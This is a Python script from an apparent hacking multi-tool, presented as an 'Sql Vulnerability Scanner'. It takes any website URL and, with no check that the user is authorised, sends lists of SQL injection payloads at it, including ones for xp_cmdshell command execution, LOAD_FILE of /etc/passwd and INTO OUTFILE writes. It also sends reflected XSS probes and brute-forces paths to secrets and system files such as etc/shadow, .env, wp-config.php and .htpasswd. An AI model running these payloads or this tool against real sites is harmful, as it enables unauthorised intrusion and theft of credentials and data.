# Copyright (c) Your.Tool (https://www.josh-studio.com)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *

try:
    import requests
    import re
    from urllib.parse import urlparse
    import concurrent.futures
except Exception as e:
    ErrorModule(e)

Title("Sql Vulnerability Scanner")

try:
    user_agent = ChoiceUserAgent()
    headers = {"User-Agent": user_agent}

    def validate_url(url):
        """Valide et normalise l'URL"""
        if not url:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} URL invalide : l'URL ne peut pas être vide")
            return None
            
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        try:
            parsed = urlparse(url)
            if not all([parsed.scheme, parsed.netloc]):
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} URL invalide : format incorrect")
                return None
                
            # Test de connexion
            response = requests.get(url, timeout=10, headers=headers, allow_redirects=True)
            response.raise_for_status()
            
            return response.url  # Retourne l'URL finale après redirections
            
        except requests.exceptions.RequestException as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Erreur de connexion : {str(e)}")
            return None

    def InterestingPath(url):
        paths = [
            "admin", "admin/", "admin/index.php", "admin/login.php", "admin/config.php",
            "backup", "backup/", "backup/db.sql", "backup/config.tar.gz", "backup/backup.sql",
            "private", "private/", "private/.env", "private/config.php", "private/secret.txt",
            "uploads", "uploads/", "uploads/file.txt", "uploads/image.jpg", "uploads/backup.zip",
            "api", "api/", "api/v1/", "api/v1/users", "api/v1/status",
            "logs", "logs/", "logs/error.log", "logs/access.log", "logs/debug.log",
            "cache", "cache/", "cache/temp/", "cache/session/", "cache/data/",
            "server-status", "server-status/", "server-status/index.html",
            "dashboard", "dashboard/", "dashboard/index.html", "dashboard/admin.php", "dashboard/settings.php",
            ".git/config", ".env", "wp-config.php", "config.php", "configuration.php",
            "includes/config.php", "conf/config.php", "db/config.php", "database.php",
            "install/", "install.php", "setup/", "setup.php", "configure/", "configure.php",
            "phpinfo.php", "info.php", "test.php", "debug.php"
        ]
        CheckPaths(url, paths, "Interesting Path")

    def SensitiveFile(url):
        files = [
            "etc/passwd", "etc/password", "etc/shadow", "etc/group", "etc/hosts", "etc/hostname",
            "var/log/auth.log", "var/log/syslog", "var/log/messages", "var/log/nginx/access.log",
            "root/.bash_history", "home/user/.bash_history", "www/html/wp-config.php", "proc/self/environ",
            "opt/lampp/phpmyadmin/config.inc.php", "boot/grub/menu.lst", "proc/net/tcp",
            ".htaccess", ".htpasswd", "web.config", "robots.txt", "sitemap.xml",
            "backup.sql", "dump.sql", "database.sql", "db.sql", "mysql.sql",
            "config.bak", "config.old", "config.save", "config.php.bak", "config.php.old",
            ".git/HEAD", ".svn/entries", ".hg/store/data", "CVS/Root", ".bzr/checkout/dirstate"
        ]
        CheckPaths(url, files, "Sensitive File")

    def Xss(url):
        payloads = [
            "<script>alert('XssFoundByYourTool')</script>",
            "<img src=x onerror=alert('XssFoundByYourTool')>",
            "<svg/onload=alert('XssFoundByYourTool')>",
            "javascript:alert('XssFoundByYourTool')",
            "\"><script>alert('XssFoundByYourTool')</script>",
            "'><script>alert('XssFoundByYourTool')</script>",
            "><script>alert('XssFoundByYourTool')</script>",
            "</script><script>alert('XssFoundByYourTool')</script>",
            "' onmouseover='alert('XssFoundByYourTool')",
            "\" onmouseover=\"alert('XssFoundByYourTool')",
            "' onfocus='alert('XssFoundByYourTool')",
            "\" onfocus=\"alert('XssFoundByYourTool')",
            "<img src=\"javascript:alert('XssFoundByYourTool')\">",
            "<iframe src=\"javascript:alert('XssFoundByYourTool')\">",
            "<svg><script>alert('XssFoundByYourTool')</script></svg>"
        ]
        indicators = [
            "<script>", "alert(", "onerror=", "<svg", "javascript:",
            "onload=", "onfocus=", "onmouseover=", "<img", "<iframe"
        ]
        TestPayloads(url, payloads, indicators, "Xss")

    def Sql(url):
        payloads = [
            "'", '"', "''", "' OR '1'='1'", "' OR '1'='1' --", "' OR '1'='1' /*", "' OR 1=1 --", "/1000",
            "' OR 1=1 /*", "' OR 'a'='a", "' OR 'a'='a' --", "' OR 'a'='a' /*", "' OR ''='", "admin'--", "admin' /*",
            "' OR 1=1#", "' OR '1'='1' (", "') OR ('1'='1", "'; EXEC xp_cmdshell('dir'); --", "' UNION SELECT NULL, NULL, NULL --", 
            "' OR 1=1 --", "' OR '1'='1' --", "' OR '1'='1' #", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR 1=1#", "' OR 1=1/*", 
            "' OR 'a'='a'#", "' OR 'a'='a'/*", "' OR ''=''", "' OR '1'='1'--", "admin' --", "admin' #", "' OR 1=1--", "' OR 1=1/*", 
            "' OR 'a'='a'--", "' OR ''=''", "' OR 'x'='x'", "' OR 'x'='x'--", "' OR 'x'='x'/*", "' OR 1=1#", "' OR 1=1--", 
            "' OR 1=1/*", "' OR '1'='1'/*", "' OR '1'='1'--", "' OR '1'='1'#", "' OR '1'='1'/*",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT @@version--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "1'; DECLARE @S VARCHAR(4000) SELECT @S = 0x73656C65637420404076657273696F6E--",
            "' AND 1=1 AND 'one'='one",
            "' AND 1=2 AND 'one'='one",
            "' HAVING 1=1 --",
            "' GROUP BY columnnames HAVING 1=1 --",
            "' SELECT if(1=1,'true','false') --",
            "1' INTO OUTFILE 'result.txt'--",
            "1' UNION ALL SELECT NULL--",
            "1' UNION ALL SELECT NULL,NULL--",
            "1' UNION ALL SELECT LOAD_FILE('/etc/passwd')--"
        ]
        indicators = [
            "SQL syntax", "SQL error", "MySQL", "mysql", "MySQLYou",
            "Unclosed quotation mark", "SQLSTATE", "syntax error", "ORA-", 
            "SQLite", "PostgreSQL", "Truncated incorrect", "Division by zero",
            "You have an error in your SQL syntax", "Incorrect syntax near", 
            "SQL command not properly ended", "sql", "Sql", "Warning", "Error",
            "Microsoft OLE DB Provider for SQL Server", "Microsoft SQL Native Client error",
            "SQLite/JDBCDriver", "SQLite.Exception", "System.Data.SQLite.SQLiteException",
            "Warning: mysql_", "[MySQL][ODBC", "Syntax error or access violation",
            "PostgreSQL query failed", "supplied argument is not a valid PostgreSQL result",
            "pg_query() [:", "pg_exec() [:", "error in your SQL syntax",
            "mysql_fetch_array()", "mysql_numrows()", "mysql_fetch_object()",
            "mysql_num_rows()", "mysql_fetch_assoc()", "mysql_fetch_row()",
            "mysql_fetch_field()", "mysql_list_fields()"
        ]
        TestPayloads(url, payloads, indicators, "Sql")

    def CheckPaths(url, paths, vulnerability_name):
        try:
            if not str(url).endswith("/"):
                url += "/"
            found = False
            
            def check_single_path(path):
                nonlocal found
                try:
                    full_url = url + path
                    response = requests.get(full_url, timeout=10, headers=headers, allow_redirects=True)
                    if response.status_code == 200:
                        found = True
                        print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white + vulnerability_name + green} Status: {white}True{green} Path Found: {white}/{path + green}")
                except requests.exceptions.RequestException:
                    pass
                    
            # Utilisation de ThreadPoolExecutor pour accélérer les tests
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(check_single_path, paths)
                
            if not found:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white + vulnerability_name + red} Status: {white}False{red}")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white + vulnerability_name + red} Status: {white}Error: {str(e)}{red}")

    def TestPayloads(url, payloads, indicators, vulnerability_name):
        try:
            try:
                response_old = requests.get(url, timeout=10, headers=headers)
                base_content = response_old.text.lower()
            except requests.exceptions.RequestException:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Impossible d'accéder à l'URL de base")
                return
                
            if not str(url).endswith("/"):
                url += "/"
            found = False
            
            def test_single_payload(payload):
                nonlocal found
                try:
                    response = requests.get(url + payload, timeout=10, headers=headers, allow_redirects=True)
                    if response.status_code == 200 and response.text.lower() != base_content:
                        for indicator in indicators:
                            if indicator.lower() in response.text.lower():
                                found = True
                                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Vulnerability: {white + vulnerability_name + green} Status: {white}True{green} Provocation: {white + payload + green} Indicator: {white + indicator}")
                                break
                except requests.exceptions.RequestException:
                    pass
                    
            # Utilisation de ThreadPoolExecutor pour accélérer les tests
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(test_single_payload, payloads)
                
            if not found:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white + vulnerability_name + red} Status: {white}False{red}")
        except Exception as e:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Vulnerability: {white + vulnerability_name + red} Status: {white}Error: {str(e)}{red}")

    Slow(sql_banner)
    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Selected User-Agent: {white + user_agent}")
    website_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
    Censored(website_url)

    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Looking for a vulnerability...")
    
    # Validation de l'URL
    website_url = validate_url(website_url)
    if not website_url:
        Continue()
        Reset()
    else:
        Sql(website_url)
        Xss(website_url)
        InterestingPath(website_url)
        SensitiveFile(website_url)
        Continue()
        Reset()

except Exception as e:
    Error(e)

